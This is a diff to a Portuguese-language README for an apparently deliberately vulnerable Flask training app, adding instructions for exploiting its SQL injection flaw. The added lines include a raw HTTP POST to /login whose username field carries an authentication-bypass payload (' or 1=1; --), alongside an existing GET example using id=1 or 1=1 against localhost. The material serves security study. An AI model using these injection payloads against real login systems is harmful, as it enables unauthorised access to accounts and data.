@@ -39,8 +39,21 @@ $ docker compose up -d
 $ python app/app.py run
 ```
 ## Explorando a vulnerabilidade
+
+Importar a collection flask-sql-injection.postman_collection.json no Postman
+
+OU
+
 ```
 $ GET http://localhost:5000/login?id=1%20or%201=1
 ```
 
+```
+POST /login HTTP/1.1
+Host: 127.0.0.1:5000
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+username='%20or%201%3D1%3B%20--%20
+```
 Baseado no projeto [EstudosAvancadosSI](https://github.com/BrunoEleodoro/EstudosAvancadosSI)
